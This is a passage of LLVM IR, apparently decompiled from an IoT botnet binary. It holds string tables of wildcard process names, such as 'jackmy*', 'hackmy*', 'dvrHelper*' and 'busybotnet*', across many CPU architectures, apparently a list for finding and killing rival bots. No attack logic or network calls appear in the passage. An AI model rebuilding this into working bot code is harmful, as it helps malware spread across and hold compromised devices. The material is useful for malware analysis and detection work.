@global_var_805aa3d.467 to i8*), i8* bitcast (i32* @global_var_805aa3f.468 to i8*), i8* bitcast (i32* @global_var_805aa41.469 to i8*), i8* bitcast (i32* @global_var_805aa43.470 to i8*), i8* bitcast (i32* @global_var_805aa45.471 to i8*), i8* bitcast (i32* @global_var_805aa47.472 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa49.473, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa4c.474, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa4f.475, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa52.476, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa55.477, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa58.478, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa5b.479, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa5e.480, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa61.481, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa64.482, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa67.483, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa6a.484, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805aa6d.485, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805aa78.486, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aa7d.487, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805aa83.488, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa88.489, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa8b.490, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa8e.491, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa91.492, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa94.493, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa97.494, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa9a.495, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa9d.496, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aaa0.497, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aaa3.498, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aaa7.499, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aaab.500, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aaaf.501, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aab3.502, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aab7.503, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aabb.504, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aabf.505, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aac3.506, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aac7.507, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805aacb.508, i32 0, i32 0)]
@global_var_80597f8.510 = constant [8 x i8] c"jackmy*\00"
@global_var_8059800.511 = constant [9 x i8] c"busybox*\00"
@global_var_8059809.512 = constant [5 x i8] c"bin*\00"
@global_var_8059819.513 = constant [5 x i8] c"arm*\00"
@global_var_805981e.514 = constant [8 x i8] c"mipsel*\00"
@global_var_805982c.515 = constant [8 x i8] c"mips64*\00"
@global_var_8059834.516 = constant [6 x i8] c"i686*\00"
@global_var_805983a.517 = constant [7 x i8] c"sparc*\00"
@global_var_805985d.518 = constant [6 x i8] c"bruv*\00"
@global_var_8059863.519 = constant [7 x i8] c"sh2eb*\00"
@global_var_805986a.520 = constant [8 x i8] c"sh2elf*\00"
@global_var_8059872.521 = constant [5 x i8] c"x86*\00"
@global_var_8059877.522 = constant [7 x i8] c"armv5*\00"
@global_var_805987e.523 = constant [9 x i8] c"armv4tl*\00"
@global_var_8059887.524 = constant [7 x i8] c"armv4*\00"
@global_var_805988e.525 = constant [7 x i8] c"armv6*\00"
@global_var_8059895.526 = constant [9 x i8] c"powerpc*\00"
@global_var_805989e.527 = constant [14 x i8] c"powerpc440fp*\00"
@global_var_80598ac.528 = constant [6 x i8] c"i586*\00"
@global_var_80598b2.529 = constant [6 x i8] c"m68k*\00"
@global_var_80598b8.530 = constant [8 x i8] c"x86_64*\00"
@global_var_80598c0.531 = constant [12 x i8] c"jackmymips*\00"
@global_var_80598cc.532 = constant [14 x i8] c"jackmymips64*\00"
@global_var_80598da.533 = constant [14 x i8] c"jackmymipsel*\00"
@global_var_80598e8.534 = constant [13 x i8] c"jackmysh2eb*\00"
@global_var_80598f5.535 = constant [14 x i8] c"jackmysh2elf*\00"
@global_var_8059903.536 = constant [11 x i8] c"jackmysh4*\00"
@global_var_805990e.537 = constant [11 x i8] c"jackmyx86*\00"
@global_var_8059919.538 = constant [13 x i8] c"jackmyarmv5*\00"
@global_var_8059926.539 = constant [15 x i8] c"jackmyarmv4tl*\00"
@global_var_8059935.540 = constant [13 x i8] c"jackmyarmv4*\00"
@global_var_8059942.541 = constant [13 x i8] c"jackmyarmv6*\00"
@global_var_805994f.542 = constant [12 x i8] c"jackmyi686*\00"
@global_var_805995b.543 = constant [15 x i8] c"jackmypowerpc*\00"
@global_var_805996a.544 = constant [20 x i8] c"jackmypowerpc440fp*\00"
@global_var_805997e.545 = constant [12 x i8] c"jackmyi586*\00"
@global_var_805998a.546 = constant [12 x i8] c"jackmym68k*\00"
@global_var_8059996.547 = constant [13 x i8] c"jackmysparc*\00"
@global_var_80599a3.548 = constant [14 x i8] c"jackmyx86_64*\00"
@global_var_80599b1.549 = constant [12 x i8] c"hackmymips*\00"
@global_var_80599bd.550 = constant [14 x i8] c"hackmymips64*\00"
@global_var_80599cb.551 = constant [14 x i8] c"hackmymipsel*\00"
@global_var_80599d9.552 = constant [13 x i8] c"hackmysh2eb*\00"
@global_var_80599e6.553 = constant [14 x i8] c"hackmysh2elf*\00"
@global_var_80599f4.554 = constant [11 x i8] c"hackmysh4*\00"
@global_var_80599ff.555 = constant [11 x i8] c"hackmyx86*\00"
@global_var_8059a0a.556 = constant [13 x i8] c"hackmyarmv5*\00"
@global_var_8059a17.557 = constant [15 x i8] c"hackmyarmv4tl*\00"
@global_var_8059a26.558 = constant [13 x i8] c"hackmyarmv4*\00"
@global_var_8059a33.559 = constant [13 x i8] c"hackmyarmv6*\00"
@global_var_8059a40.560 = constant [12 x i8] c"hackmyi686*\00"
@global_var_8059a4c.561 = constant [15 x i8] c"hackmypowerpc*\00"
@global_var_8059a5b.562 = constant [20 x i8] c"hackmypowerpc440fp*\00"
@global_var_8059a6f.563 = constant [12 x i8] c"hackmyi586*\00"
@global_var_8059a7b.564 = constant [12 x i8] c"hackmym68k*\00"
@global_var_8059a87.565 = constant [13 x i8] c"hackmysparc*\00"
@global_var_8059a94.566 = constant [14 x i8] c"hackmyx86_64*\00"
@global_var_8059aa2.567 = constant [4 x i8] c"b1*\00"
@global_var_8059aa6.568 = constant [4 x i8] c"b2*\00"
@global_var_8059aaa.569 = constant [4 x i8] c"b3*\00"
@global_var_8059aae.570 = constant [4 x i8] c"b4*\00"
@global_var_8059ab2.571 = constant [4 x i8] c"b5*\00"
@global_var_8059ab6.572 = constant [4 x i8] c"b6*\00"
@global_var_8059aba.573 = constant [4 x i8] c"b7*\00"
@global_var_8059abe.574 = constant [4 x i8] c"b8*\00"
@global_var_8059ac2.575 = constant [4 x i8] c"b9*\00"
@global_var_8059ac6.576 = constant [5 x i8] c"b10*\00"
@global_var_8059acb.577 = constant [5 x i8] c"b11*\00"
@global_var_8059ad0.578 = constant [5 x i8] c"b12*\00"
@global_var_8059ad5.579 = constant [5 x i8] c"b13*\00"
@global_var_8059ada.580 = constant [5 x i8] c"b14*\00"
@global_var_8059adf.581 = constant [5 x i8] c"b15*\00"
@global_var_8059ae4.582 = constant [5 x i8] c"b16*\00"
@global_var_8059ae9.583 = constant [5 x i8] c"b17*\00"
@global_var_8059aee.584 = constant [5 x i8] c"b18*\00"
@global_var_8059af3.585 = constant [5 x i8] c"b19*\00"
@global_var_8059af8.586 = constant [5 x i8] c"b20*\00"
@global_var_8059afd.587 = constant [18 x i8] c"busyboxterrorist*\00"
@global_var_8059b0f.588 = constant [10 x i8] c"DFhxdhdf*\00"
@global_var_8059b19.589 = constant [11 x i8] c"dvrHelper*\00"
@global_var_8059b24.590 = constant [9 x i8] c"FDFDHFC*\00"
@global_var_8059b2d.591 = constant [6 x i8] c"FEUB*\00"
@global_var_8059b33.592 = constant [10 x i8] c"FTUdftui*\00"
@global_var_8059b3d.593 = constant [10 x i8] c"GHfjfgvj*\00"
@global_var_8059b47.594 = constant [7 x i8] c"jhUOH*\00"
@global_var_8059b4e.595 = constant [10 x i8] c"JIPJIPJj*\00"
@global_var_8059b58.596 = constant [11 x i8] c"JIPJuipjh*\00"
@global_var_8059b63.597 = constant [9 x i8] c"kmymips*\00"
@global_var_8059b6c.598 = constant [11 x i8] c"kmymips64*\00"
@global_var_8059b77.599 = constant [11 x i8] c"kmymipsel*\00"
@global_var_8059b82.600 = constant [10 x i8] c"kmysh2eb*\00"
@global_var_8059b8c.601 = constant [11 x i8] c"kmysh2elf*\00"
@global_var_8059b97.602 = constant [8 x i8] c"kmysh4*\00"
@global_var_8059b9f.603 = constant [8 x i8] c"kmyx86*\00"
@global_var_8059ba7.604 = constant [10 x i8] c"kmyarmv5*\00"
@global_var_8059bb1.605 = constant [12 x i8] c"kmyarmv4tl*\00"
@global_var_8059bbd.606 = constant [10 x i8] c"kmyarmv4*\00"
@global_var_8059bc7.607 = constant [10 x i8] c"kmyarmv6*\00"
@global_var_8059bd1.608 = constant [9 x i8] c"kmyi686*\00"
@global_var_8059bda.609 = constant [12 x i8] c"kmypowerpc*\00"
@global_var_8059be6.610 = constant [17 x i8] c"kmypowerpc440fp*\00"
@global_var_8059bf7.611 = constant [9 x i8] c"kmyi586*\00"
@global_var_8059c00.612 = constant [9 x i8] c"kmym68k*\00"
@global_var_8059c09.613 = constant [10 x i8] c"kmysparc*\00"
@global_var_8059c13.614 = constant [11 x i8] c"kmyx86_64*\00"
@global_var_8059c1e.615 = constant [9 x i8] c"lolmips*\00"
@global_var_8059c27.616 = constant [11 x i8] c"lolmips64*\00"
@global_var_8059c32.617 = constant [11 x i8] c"lolmipsel*\00"
@global_var_8059c3d.618 = constant [10 x i8] c"lolsh2eb*\00"
@global_var_8059c47.619 = constant [11 x i8] c"lolsh2elf*\00"
@global_var_8059c52.620 = constant [8 x i8] c"lolsh4*\00"
@global_var_8059c5a.621 = constant [8 x i8] c"lolx86*\00"
@global_var_8059c62.622 = constant [10 x i8] c"lolarmv5*\00"
@global_var_8059c6c.623 = constant [12 x i8] c"lolarmv4tl*\00"
@global_var_8059c78.624 = constant [10 x i8] c"lolarmv4*\00"
@global_var_8059c82.625 = constant [10 x i8] c"lolarmv6*\00"
@global_var_8059c8c.626 = constant [9 x i8] c"loli686*\00"
@global_var_8059c95.627 = constant [12 x i8] c"lolpowerpc*\00"
@global_var_8059ca1.628 = constant [17 x i8] c"lolpowerpc440fp*\00"
@global_var_8059cb2.629 = constant [9 x i8] c"loli586*\00"
@global_var_8059cbb.630 = constant [9 x i8] c"lolm68k*\00"
@global_var_8059cc4.631 = constant [10 x i8] c"lolsparc*\00"
@global_var_8059cce.632 = constant [9 x i8] c"RYrydry*\00"
@global_var_8059cd7.633 = constant [9 x i8] c"telmips*\00"
@global_var_8059ce0.634 = constant [11 x i8] c"telmips64*\00"
@global_var_8059ceb.635 = constant [11 x i8] c"telmipsel*\00"
@global_var_8059cf6.636 = constant [10 x i8] c"telsh2eb*\00"
@global_var_8059d00.637 = constant [11 x i8] c"telsh2elf*\00"
@global_var_8059d0b.638 = constant [8 x i8] c"telsh4*\00"
@global_var_8059d13.639 = constant [8 x i8] c"telx86*\00"
@global_var_8059d1b.640 = constant [10 x i8] c"telarmv5*\00"
@global_var_8059d25.641 = constant [12 x i8] c"telarmv4tl*\00"
@global_var_8059d31.642 = constant [10 x i8] c"telarmv4*\00"
@global_var_8059d3b.643 = constant [10 x i8] c"telarmv6*\00"
@global_var_8059d45.644 = constant [9 x i8] c"teli686*\00"
@global_var_8059d4e.645 = constant [12 x i8] c"telpowerpc*\00"
@global_var_8059d5a.646 = constant [17 x i8] c"telpowerpc440fp*\00"
@global_var_8059d6b.647 = constant [9 x i8] c"teli586*\00"
@global_var_8059d74.648 = constant [9 x i8] c"telm68k*\00"
@global_var_8059d7d.649 = constant [10 x i8] c"telsparc*\00"
@global_var_8059d87.650 = constant [11 x i8] c"telx86_64*\00"
@global_var_8059d92.651 = constant [13 x i8] c"TwoFacemips*\00"
@global_var_8059d9f.652 = constant [15 x i8] c"TwoFacemips64*\00"
@global_var_8059dae.653 = constant [15 x i8] c"TwoFacemipsel*\00"
@global_var_8059dbd.654 = constant [14 x i8] c"TwoFacesh2eb*\00"
@global_var_8059dcb.655 = constant [15 x i8] c"TwoFacesh2elf*\00"
@global_var_8059dda.656 = constant [12 x i8] c"TwoFacesh4*\00"
@global_var_8059de6.657 = constant [12 x i8] c"TwoFacex86*\00"
@global_var_8059df2.658 = constant [14 x i8] c"TwoFacearmv5*\00"
@global_var_8059e00.659 = constant [16 x i8] c"TwoFacearmv4tl*\00"
@global_var_8059e10.660 = constant [14 x i8] c"TwoFacearmv4*\00"
@global_var_8059e1e.661 = constant [14 x i8] c"TwoFacearmv6*\00"
@global_var_8059e2c.662 = constant [13 x i8] c"TwoFacei686*\00"
@global_var_8059e39.663 = constant [16 x i8] c"TwoFacepowerpc*\00"
@global_var_8059e49.664 = constant [21 x i8] c"TwoFacepowerpc440fp*\00"
@global_var_8059e5e.665 = constant [13 x i8] c"TwoFacei586*\00"
@global_var_8059e6b.666 = constant [13 x i8] c"TwoFacem68k*\00"
@global_var_8059e78.667 = constant [14 x i8] c"TwoFacesparc*\00"
@global_var_8059e86.668 = constant [15 x i8] c"TwoFacex86_64*\00"
@global_var_8059e95.669 = constant [10 x i8] c"UYyuyioy*\00"
@global_var_8059e9f.670 = constant [10 x i8] c"XDzdfxzf*\00"
@global_var_8059ea9.671 = constant [6 x i8] c"xxb1*\00"
@global_var_8059eaf.672 = constant [6 x i8] c"xxb2*\00"
@global_var_8059eb5.673 = constant [6 x i8] c"xxb3*\00"
@global_var_8059ebb.674 = constant [6 x i8] c"xxb4*\00"
@global_var_8059ec1.675 = constant [6 x i8] c"xxb5*\00"
@global_var_8059ec7.676 = constant [6 x i8] c"xxb6*\00"
@global_var_8059ecd.677 = constant [6 x i8] c"xxb7*\00"
@global_var_8059ed3.678 = constant [6 x i8] c"xxb8*\00"
@global_var_8059ed9.679 = constant [6 x i8] c"xxb9*\00"
@global_var_8059edf.680 = constant [7 x i8] c"xxb10*\00"
@global_var_8059ee6.681 = constant [7 x i8] c"xxb11*\00"
@global_var_8059eed.682 = constant [7 x i8] c"xxb12*\00"
@global_var_8059ef4.683 = constant [7 x i8] c"xxb13*\00"
@global_var_8059efb.684 = constant [7 x i8] c"xxb14*\00"
@global_var_8059f02.685 = constant [7 x i8] c"xxb15*\00"
@global_var_8059f09.686 = constant [7 x i8] c"xxb16*\00"
@global_var_8059f10.687 = constant [7 x i8] c"xxb17*\00"
@global_var_8059f17.688 = constant [7 x i8] c"xxb18*\00"
@global_var_8059f1e.689 = constant [7 x i8] c"xxb19*\00"
@global_var_8059f25.690 = constant [7 x i8] c"xxb20*\00"
@global_var_8059f2c.691 = constant [3 x i8] c"1*\00"
@global_var_8059f2f.692 = constant [3 x i8] c"2*\00"
@global_var_8059f32.693 = constant [3 x i8] c"3*\00"
@global_var_8059f35.694 = constant [3 x i8] c"4*\00"
@global_var_8059f38.695 = constant [3 x i8] c"5*\00"
@global_var_8059f3b.696 = constant [3 x i8] c"6*\00"
@global_var_8059f3e.697 = constant [3 x i8] c"7*\00"
@global_var_8059f41.698 = constant [3 x i8] c"8*\00"
@global_var_8059f44.699 = constant [3 x i8] c"9*\00"
@global_var_8059f47.700 = constant [4 x i8] c"10*\00"
@global_var_8059f4b.701 = constant [4 x i8] c"11*\00"
@global_var_8059f4f.702 = constant [4 x i8] c"12*\00"
@global_var_8059f53.703 = constant [4 x i8] c"13*\00"
@global_var_8059f57.704 = constant [4 x i8] c"14*\00"
@global_var_8059f5b.705 = constant [4 x i8] c"15*\00"
@global_var_8059f5f.706 = constant [4 x i8] c"16*\00"
@global_var_8059f63.707 = constant [4 x i8] c"17*\00"
@global_var_8059f67.708 = constant [4 x i8] c"18*\00"
@global_var_8059f6b.709 = constant [4 x i8] c"19*\00"
@global_var_8059f6f.710 = constant [4 x i8] c"20*\00"
@global_var_8059f73.711 = constant [4 x i8] c"bb*\00"
@global_var_8059f77.712 = constant [12 x i8] c"busybotnet*\00"
@global_var_8059f83.713 = constant [6 x i8] c"pppd*\00"
@global_var_8059f89.714 = constant [7 x i8] c"pppoe*\00"
@global_var_8059f90.715 = constant [6 x i8] c"wput*\00"
@global_var_8059f96.716 = constant [4 x i8] c"B1*\00"
@global_var_8059f9a.717 = constant [4 x i8] c"B2*\00"
@global_var_8059f9e.718 = constant [4 x i8] c"B3*\00"
@global_var_8059fa2.719 = constant [4 x i8] c"B4*\00"
@global_var_8059fa6.720 = constant [4 x i8] c"B5*\00"
@global_var_8059faa.721 = constant [4 x i8] c"B6*\00"
@global_var_8059fae.722 = constant [4 x i8] c"B7*\00"
@global_var_8059fb2.723 = constant [4 x i8] c"B8*\00"
@global_var_8059fb6.724 = constant [4 x i8] c"B9*\00"
@global_var_8059fba.725 = constant [5 x i8] c"B10*\00"
@global_var_8059fbf.726 = constant [5 x i8] c"B11*\00"
@global_var_8059fc4.727 = constant [5 x i8] c"B12*\00"
@global_var_8059fc9.728 = constant [5 x i8] c"B13*\00"
@global_var_8059fce.729 = constant [5 x i8] c"B14*\00"
@global_var_8059fd3.730 = constant [5 x i8] c"B15*\00"
@global_var_8059fd8.731 = constant [5 x i8] c"B16*\00"
@global_var_8059fdd.732 = constant [5 x i8] c"B17*\00"
@global_var_8059fe2.733 = constant [5 x i8] c"B18*\00"
@global_var_8059fe7.734 = constant [5 x i8] c"B20*\00"
@global_var_8059fec.735 = constant [11 x i8] c"dvrhelper*\00"
@global_var_805a000.736 = constant [241 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80597f8.510, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059800.511, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059809.512, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805980e.277, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059813.282, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059819.513, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805981e.514, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059826.276, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805982c.515, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059834.516, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805983a.517, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059841.280, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059846.271, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805984b.281, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059856.273, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805985d.518, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059826.276, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805982c.515, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805981e.514, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059863.519, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805986a.520, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059841.280, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059872.521, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059819.513, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059877.522, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805987e.523, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059887.524, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805988e.525, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059834.516, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059895.526, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805989e.527, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80598ac.528, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80598b2.529, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805983a.517, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80598b8.530, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80598c0.531, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80598cc.532, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80598da.533, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80598e8.534, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80598f5.535, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059903.536, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805990e.537, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059919.538, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8059926.539, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059935.540, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059942.541, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805994f.542, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805995b.543, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_805996a.544, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805997e.545, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805998a.546, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059996.547, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80599a3.548, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80599b1.549, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80599bd.550, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80599cb.551, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80599d9.552, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80599e6.553, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80599f4.554, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80599ff.555, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059a0a.556, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8059a17.557, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059a26.558, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059a33.559, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059a40.560, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8059a4c.561, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_8059a5b.562, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059a6f.563, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8059a7b.564, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8059a87.565, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059a94.566, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059aa2.567, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059aa6.568, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059aaa.569, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059aae.570, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059ab2.571, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059ab6.572, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059aba.573, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059abe.574, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059ac2.575, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059ac6.576, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059acb.577, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059ad0.578, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059ad5.579, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059ada.580, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059adf.581, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059ae4.582, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059ae9.583, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059aee.584, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059af3.585, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059af8.586, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_8059afd.587, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059b0f.588, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059b19.589, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059b24.590, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059b2d.591, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059b33.592, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059b3d.593, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059b47.594, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059b4e.595, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059b58.596, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059b63.597, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059b6c.598, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059b77.599, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059b82.600, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8059b8c.601, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x 